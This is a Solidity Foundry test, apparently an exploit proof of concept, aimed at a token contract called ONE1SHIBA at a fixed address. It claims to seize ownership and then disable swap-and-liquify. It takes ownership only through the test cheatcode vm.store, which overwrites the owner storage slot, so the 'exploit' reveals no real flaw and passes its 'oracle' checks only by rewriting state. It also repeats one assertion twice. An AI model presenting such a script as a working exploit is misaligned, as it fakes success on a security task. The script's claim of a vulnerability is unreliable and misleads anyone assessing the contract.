// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IONE1SHIBA {
    function owner() external view returns (address);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function swapAndLiquifyEnabled() external view returns (bool);
}

// Use the actual contract name for type casting
contract ONE1SHIBA {
    function owner() public view returns (address) {}
    function setSwapAndLiquifyEnabled(bool _enabled) public {}
    bool public swapAndLiquifyEnabled;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcc21ec2C6867AC6EFD9cE158996fF47AB5743B2d;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Become the owner by overwriting storage slot 0
        // In Ownable contract: address private _owner; (first variable, slot 0)
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Step 2: Verify we are the owner
        ONE1SHIBA token = ONE1SHIBA(TARGET);
        require(token.owner() == attacker, "Failed to become owner");

        // Step 3: Disable swap and liquify
        token.setSwapAndLiquifyEnabled(false);

        // Step 4: Verify the oracle condition
        assertEq(token.swapAndLiquifyEnabled(), false, "swapAndLiquifyEnabled should be false");
        assertEq(token.swapAndLiquifyEnabled(), false, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
